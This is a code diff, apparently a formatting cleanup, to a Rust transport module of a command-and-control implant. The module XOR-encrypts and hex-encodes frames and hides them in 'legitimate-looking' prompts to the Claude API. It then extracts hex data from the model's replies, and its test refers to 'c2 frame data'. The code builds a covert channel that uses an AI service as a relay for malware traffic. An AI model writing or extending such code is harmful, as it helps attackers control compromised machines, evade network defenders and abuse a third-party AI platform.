@@ -108,9 +108,9 @@ impl LlmApiTransport {
 
         // Parse the response. Anthropic Messages API returns:
         // { "content": [{ "type": "text", "text": "..." }], ... }
-        let json: serde_json::Value = resp.into_json().map_err(|_| {
-            TransportError::Transient("failed to parse LLM API response")
-        })?;
+        let json: serde_json::Value = resp
+            .into_json()
+            .map_err(|_| TransportError::Transient("failed to parse LLM API response"))?;
 
         // Check for API-level errors.
         if json.get("error").is_some() {
@@ -141,7 +141,7 @@ impl LlmApiTransport {
                 }
             } else if let Some(s) = run_start.take() {
                 let run = &text[s..i];
-                if run.len() >= 8 && longest.map_or(true, |l| run.len() > l.len()) {
+                if run.len() >= 8 && longest.is_none_or(|l| run.len() > l.len()) {
                     longest = Some(run);
                 }
             }
@@ -149,7 +149,7 @@ impl LlmApiTransport {
         // Flush any run that extends to the end of the text.
         if let Some(s) = run_start {
             let run = &text[s..];
-            if run.len() >= 8 && longest.map_or(true, |l| run.len() > l.len()) {
+            if run.len() >= 8 && longest.is_none_or(|l| run.len() > l.len()) {
                 longest = Some(run);
             }
         }
@@ -187,7 +187,10 @@ impl Transport for LlmApiTransport {
         let hex_ct = hex::encode(&ciphertext);
 
         // 3. Embed in a legitimate-looking Claude prompt.
-        let prompt = format!("[{conv_id}] {HEX_PREAMBLE}{hex_ct}", conv_id = self.conversation_id);
+        let prompt = format!(
+            "[{conv_id}] {HEX_PREAMBLE}{hex_ct}",
+            conv_id = self.conversation_id
+        );
 
         // 4. POST to Claude API.
         self.post_message(&prompt, 50)?;
@@ -204,8 +207,8 @@ impl Transport for LlmApiTransport {
         let text = self.post_message(RECV_PROMPT, 200)?;
 
         // Extract the hex block from Claude's response.
-        let hex_ct =
-            Self::extract_hex(&text).ok_or(TransportError::Transient("no hex data in LLM response"))?;
+        let hex_ct = Self::extract_hex(&text)
+            .ok_or(TransportError::Transient("no hex data in LLM response"))?;
 
         // Decode hex → ciphertext.
         let ciphertext = hex::decode(&hex_ct)
@@ -240,9 +243,9 @@ impl Transport for LlmApiTransport {
     }
 
     fn init(&mut self) -> Result<(), TransportError> {
-        self.health_check()
-            .map(|_| ())
-            .ok_or(TransportError::Dead("LLM API key invalid or endpoint unreachable"))
+        self.health_check().map(|_| ()).ok_or(TransportError::Dead(
+            "LLM API key invalid or endpoint unreachable",
+        ))
     }
 }
 
@@ -273,7 +276,8 @@ mod tests {
     #[test]
     fn xor_roundtrip() {
         let key = [0xAAu8; 32];
-        let transport = LlmApiTransport::new("sk-test".into(), "claude-sonnet-4-20250514".into(), key);
+        let transport =
+            LlmApiTransport::new("sk-test".into(), "claude-sonnet-4-20250514".into(), key);
         let plaintext = b"hello world c2 frame data";
         let ct = transport.xor_frame(plaintext);
         let pt = transport.xor_frame(&ct);
